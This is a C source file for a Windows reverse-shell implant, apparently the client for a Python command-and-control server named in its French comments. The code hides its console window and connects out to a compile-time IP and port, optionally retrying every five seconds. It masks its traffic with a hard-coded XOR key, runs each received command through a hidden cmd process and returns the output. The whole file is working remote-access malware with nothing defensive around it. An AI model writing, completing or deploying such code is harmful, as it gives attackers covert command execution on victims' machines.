#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP   (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif

/* Clé XOR 32 bytes — même que c2_server.py */
static const uint8_t KEY[32] = {
    0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,
    0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c,
    0x76,0x2e,0x71,0x60,0xf3,0x8b,0x4d,0xa5,
    0x6a,0x78,0x4d,0x90,0x45,0x19,0x0c,0xfe
};

/* XOR cipher */
static void xor_crypt(uint8_t* data, int len) {
    for (int i = 0; i < len; i++)
        data[i] ^= KEY[i % 32];
}

/* Recevoir exactement n bytes */
static int recv_all(SOCKET s, uint8_t* buf, int n) {
    int t = 0, r;
    while (t < n) {
        r = recv(s, (char*)(buf + t), n - t, 0);
        if (r <= 0) return -1;
        t += r;
    }
    return t;
}

/* Envoyer: [4B len][XOR(data)] */
static int send_msg(SOCKET s, const uint8_t* data, int len) {
    uint8_t* enc = (uint8_t*)malloc(len);
    if (!enc) return -1;
    memcpy(enc, data, len);
    xor_crypt(enc, len);
    uint8_t hdr[4] = {(len>>24)&0xFF,(len>>16)&0xFF,(len>>8)&0xFF,len&0xFF};
    send(s, (char*)hdr, 4, 0);
    send(s, (char*)enc, len, 0);
    free(enc);
    return 0;
}

/* Recevoir: [4B len][XOR(data)] → déchiffré */
static uint8_t* recv_msg(SOCKET s, int* olen) {
    uint8_t hdr[4];
    if (recv_all(s, hdr, 4) < 0) return NULL;
    int len = (hdr[0]<<24)|(hdr[1]<<16)|(hdr[2]<<8)|hdr[3];
    if (len <= 0 || len > 65536) return NULL;
    uint8_t* buf = (uint8_t*)malloc(len + 1);
    if (!buf) return NULL;
    if (recv_all(s, buf, len) < 0) { free(buf); return NULL; }
    xor_crypt(buf, len);
    buf[len] = 0;
    *olen = len;
    return buf;
}

/* Exécuter commande via pipe */
static char* exec_cmd(const char* cmd) {
    char* out = (char*)malloc(65536);
    if (!out) return NULL;
    int out_len = 0;
    out[0] = 0;

    HANDLE rd, wr;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        strcpy(out, "[pipe failed]\r\n");
        return out;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd /C %s", cmd);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr);
        strcpy(out, "[createprocess failed]\r\n");
        return out;
    }
    CloseHandle(wr);

    WaitForSingleObject(pi.hProcess, 4000);

    DWORD avail, bread;
    int attempts = 0;
    while (out_len < 65534 && attempts < 20) {
        avail = 0;
        PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
        if (avail == 0) { Sleep(100); attempts++; continue; }
        if (avail > (DWORD)(65534 - out_len)) avail = 65534 - out_len;
        if (!ReadFile(rd, out + out_len, avail, &bread, NULL)) break;
        out_len += bread;
        attempts = 0;
        Sleep(50);
    }
    out[out_len] = 0;

    CloseHandle(rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (out_len == 0) strcpy(out, "[no output]\r\n");
    return out;
}

int main(void) {
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) return 1;

    HWND hw = GetConsoleWindow();
    if (hw) ShowWindow(hw, SW_HIDE);

    WSADATA w;
    if (WSAStartup(MAKEWORD(2,2), &w) != 0) return 1;

    struct sockaddr_in sa;
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
    while (connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) Sleep(5000);
#else
    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) return 1;
#endif

    while (1) {
        int clen = 0;
        uint8_t* cmd = recv_msg(s, &clen);
        if (!cmd) break;

        /* Nettoyer \r\n */
        char cmdstr[4096] = {0};
        int l = (clen < 4095) ? clen : 4095;
        memcpy(cmdstr, cmd, l);
        free(cmd);
        while (l > 0 && (cmdstr[l-1] == '\r' || cmdstr[l-1] == '\n'))
            cmdstr[--l] = 0;
        if (l == 0) { send_msg(s, (uint8_t*)"\r\n", 2); continue; }

        char* out = exec_cmd(cmdstr);
        if (out) { send_msg(s, (uint8_t*)out, strlen(out)); free(out); }
        else send_msg(s, (uint8_t*)"[error]\r\n", 9);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
